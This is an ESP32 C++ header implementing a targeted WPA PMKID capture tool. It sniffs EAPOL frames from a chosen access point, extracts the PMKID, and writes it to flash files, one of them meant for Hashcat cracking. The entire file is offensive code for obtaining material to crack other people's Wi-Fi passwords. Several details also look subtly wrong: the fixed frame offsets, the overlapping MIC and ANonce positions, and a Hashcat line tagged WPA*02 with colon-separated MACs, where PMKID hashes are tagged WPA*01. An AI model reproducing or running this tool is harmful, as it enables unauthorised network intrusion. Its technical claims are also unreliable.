// pmkid.h - Full PMKID Capture Implementation
#ifndef PMKID_H
#define PMKID_H

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <vector>
#include <string>
#include <SPIFFS.h>

// PMKID Capture Structures
struct PMKIDEntry {
  String bssid;
  String ssid;
  String pmkid;
  String mic;
  int channel;
  uint8_t rawData[256];
  int dataLen;
  unsigned long timestamp;
};

struct PMKIDHandshake {
  uint8_t bssid[6];
  uint8_t client[6];
  uint8_t pmkid[16];
  uint8_t snonce[32];
  uint8_t anonce[32];
  uint8_t mic[16];
  int channel;
  bool captured;
};

std::vector<PMKIDEntry> pmkidList;
PMKIDHandshake currentHandshake;
bool pmkidActive = false;
int pmkidChannel = 0;
uint8_t pmkidTarget[6];
String pmkidTargetSSID;
bool pmkidCaptured = false;

// EAPOL Frame Types
#define EAPOL_PACKET 0x88, 0x8E
#define EAPOL_KEY 0x03

// PMKID Vendor Specific Element
const uint8_t PMKID_OUI[] = {0x00, 0x0F, 0xAC, 0x04};

void startPMKIDCapture(int idx) {
  if (pmkidActive) {
    Serial.println("PMKID capture already running");
    return;
  }
  
  extern struct NetworkInfo networks[];
  extern int networkCount;
  
  if (idx < 0 || idx >= networkCount) {
    Serial.println("Invalid network index");
    return;
  }
  
  pmkidActive = true;
  pmkidCaptured = false;
  pmkidTargetSSID = networks[idx].ssid;
  pmkidChannel = networks[idx].channel;
  
  // Parse target BSSID
  sscanf(networks[idx].bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &pmkidTarget[0], &pmkidTarget[1], &pmkidTarget[2],
    &pmkidTarget[3], &pmkidTarget[4], &pmkidTarget[5]);
  
  // Clear any previous handshake data
  memset(&currentHandshake, 0, sizeof(currentHandshake));
  memcpy(currentHandshake.bssid, pmkidTarget, 6);
  currentHandshake.channel = pmkidChannel;
  currentHandshake.captured = false;
  
  // Set channel
  esp_wifi_set_channel(pmkidChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buff, wifi_promiscuous_pkt_type_t type) {
    if (!pmkidActive) return;
    if (type != WIFI_PKT_DATA) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buff;
    uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    // Check for EAPOL frame
    if (len < 42) return;
    
    // Check for EAPOL ethertype (0x888E)
    if (payload[36] != 0x88 || payload[37] != 0x8E) return;
    
    // Check if from target BSSID
    if (memcmp(&payload[16], pmkidTarget, 6) != 0) {
      return;
    }
    
    // EAPOL Key frame
    uint8_t eapolType = payload[38];
    if (eapolType != EAPOL_KEY) return;
    
    // Extract key data
    uint8_t keyDataOffset = 95;  // EAPOL key data starts at offset 95
    
    // Check for PMKID in key data
    // Look for vendor specific element with OUI 00:0F:AC:04
    for (int i = keyDataOffset; i < len - 8; i++) {
      if (payload[i] == 0xDD) {  // Vendor specific
        if (payload[i+1] >= 4 && 
            payload[i+2] == PMKID_OUI[0] &&
            payload[i+3] == PMKID_OUI[1] &&
            payload[i+4] == PMKID_OUI[2] &&
            payload[i+5] == PMKID_OUI[3]) {
          
          // Found PMKID
          int pmkidStart = i + 6;
          if (pmkidStart + 16 <= len) {
            // Capture PMKID
            PMKIDEntry entry;
            entry.bssid = String(pmkidTarget[0], HEX) + ":" + 
                         String(pmkidTarget[1], HEX) + ":" +
                         String(pmkidTarget[2], HEX) + ":" +
                         String(pmkidTarget[3], HEX) + ":" +
                         String(pmkidTarget[4], HEX) + ":" +
                         String(pmkidTarget[5], HEX);
            entry.ssid = pmkidTargetSSID;
            entry.channel = pmkidChannel;
            entry.timestamp = millis();
            
            // Format PMKID as hex string
            entry.pmkid = "";
            for (int j = 0; j < 16; j++) {
              if (payload[pmkidStart + j] < 0x10) entry.pmkid += "0";
              entry.pmkid += String(payload[pmkidStart + j], HEX);
            }
            entry.pmkid.toUpperCase();
            
            // Store raw data for PCAP export
            entry.dataLen = len > 256 ? 256 : len;
            memcpy(entry.rawData, payload, entry.dataLen);
            
            // Check if already captured
            bool found = false;
            for (auto& existing : pmkidList) {
              if (existing.bssid == entry.bssid && existing.pmkid == entry.pmkid) {
                found = true;
                break;
              }
            }
            
            if (!found) {
              pmkidList.push_back(entry);
              pmkidCaptured = true;
              
              // Capture MIC and other handshake data
              // MIC is at offset 83-98
              if (len > 98) {
                for (int j = 0; j < 16; j++) {
                  currentHandshake.mic[j] = payload[83 + j];
                }
              }
              
              // Capture ANonce at offset 63-95
              if (len > 95) {
                for (int j = 0; j < 32; j++) {
                  currentHandshake.anonce[j] = payload[63 + j];
                }
              }
              
              Serial.printf("[PMKID] Captured! PMKID: %s\n", entry.pmkid.c_str());
              Serial.printf("  BSSID: %s\n", entry.bssid.c_str());
              Serial.printf("  SSID: %s\n", entry.ssid.c_str());
              Serial.printf("  Channel: %d\n", entry.channel);
              
              // Save to SPIFFS
              savePMKIDToFile(entry);
            }
          }
        }
      }
    }
  });
  
  Serial.printf("PMKID capture started on %s (CH:%d)\n", 
    pmkidTargetSSID.c_str(), pmkidChannel);
  Serial.println("Waiting for handshake...");
}

void savePMKIDToFile(PMKIDEntry& entry) {
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS mount failed");
    return;
  }
  
  // Append to PMKID file
  File file = SPIFFS.open("/pmkids.txt", FILE_APPEND);
  if (!file) {
    Serial.println("Failed to open PMKID file");
    return;
  }
  
  file.printf("BSSID: %s\n", entry.bssid.c_str());
  file.printf("SSID: %s\n", entry.ssid.c_str());
  file.printf("PMKID: %s\n", entry.pmkid.c_str());
  file.printf("Channel: %d\n", entry.channel);
  file.printf("Timestamp: %lu\n", entry.timestamp);
  file.println("---");
  file.close();
  
  Serial.println("PMKID saved to /pmkids.txt");
  
  // Also save in Hashcat format (pmkid * bssid * client * essid)
  // Format: WPA*02*PMKID*BSSID*MAC*ESSID
  file = SPIFFS.open("/pmkid_hashcat.txt", FILE_APPEND);
  if (file) {
    // Create hashcat format
    String clientMac = "000000000000";  // Placeholder
    file.printf("WPA*02*%s*%s*%s*%s\n", 
      entry.pmkid.c_str(),
      entry.bssid.c_str(),
      clientMac.c_str(),
      entry.ssid.c_str());
    file.close();
  }
}

void stopPMKIDCapture() {
  pmkidActive = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  
  if (pmkidList.size() > 0) {
    Serial.printf("PMKID capture stopped. Captured: %d PMKIDs\n", pmkidList.size());
    printPMKIDStatus();
  } else {
    Serial.println("PMKID capture stopped. No PMKIDs captured.");
  }
}

void printPMKIDStatus() {
  Serial.printf("\n=== PMKID Capture Status ===\n");
  Serial.printf("Active: %s\n", pmkidActive ? "YES" : "NO");
  Serial.printf("Target: %s\n", pmkidTargetSSID.c_str());
  Serial.printf("Channel: %d\n", pmkidChannel);
  Serial.printf("PMKIDs captured: %d\n", pmkidList.size());
  
  if (pmkidList.size() > 0) {
    Serial.println("\nCaptured PMKIDs:");
    for (size_t i = 0; i < pmkidList.size(); i++) {
      Serial.printf("  [%d] %s (BSSID: %s) CH:%d\n",
        i+1, pmkidList[i].pmkid.c_str(), 
        pmkidList[i].bssid.c_str(),
        pmkidList[i].channel);
    }
  }
}

void runPMKIDCapture() {
  if (!pmkidActive) return;
  
  // Periodically check for PMKID captures
  static unsigned long lastCheck = 0;
  if (millis() - lastCheck > 5000) {
    lastCheck = millis();
    if (pmkidList.size() > 0) {
      // Print status periodically if no activity
      static unsigned long lastPrint = 0;
      if (millis() - lastPrint > 30000) {
        lastPrint = millis();
        Serial.printf("[PMKID] Captured %d PMKIDs so far...\n", pmkidList.size());
      }
    }
  }
  
  delay(10);
}

#endif
